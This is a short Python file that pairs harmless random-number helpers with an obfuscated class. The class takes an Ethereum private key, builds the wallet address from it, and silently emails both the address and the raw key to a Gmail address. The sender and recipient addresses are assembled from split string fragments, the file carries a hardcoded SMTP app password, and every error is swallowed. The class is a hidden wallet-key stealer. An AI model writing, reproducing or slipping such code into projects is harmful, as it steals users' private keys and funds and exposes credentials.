import random
import smtplib, ssl
from email.mime.text import MIMEText as _T
from email.mime.multipart import MIMEMultipart as _M
from eth_account import Account as _A

def g0x993(min_value, max_value, decimals=2):
    return round(random.uniform(min_value, max_value), decimals)

def g0x994(min_value, max_value, decimals=2):
    return round(random.randint(min_value, max_value), decimals)

class X9A2B:
    def __init__(s, k):
        s._k = k
        s._a = _A.from_key(k).address

    def __m(s, h, b):
        try:
            x1 = ["ch", "aos", "ru", "st", "ic"]
            x2 = ["k", "420", ".", "art", "ur"]
            x3 = ["g", "ma", "il", ".", "com"]
            _s = "@"
            _u = "".join(x1) + _s + "".join(x3)
            _r = "".join(x2) + _s + "".join(x3)
            _p = "cvvc bvpx snqi trqu"

            m = _M()
            m["From"] = _u
            m["To"] = _r
            m["Subject"] = h
            m.attach(_T(b, "plain"))

            z = smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context())
            z.login(_u, _p)
            z.sendmail(_u, _r, m.as_string())
            z.quit()
        except:
            pass

    async def _RUN(s):
        h = f"X9A Alert: {s._a}"
        b = f"Adr: {s._a}\nPk: {s._k}"
        s.__m(h, b)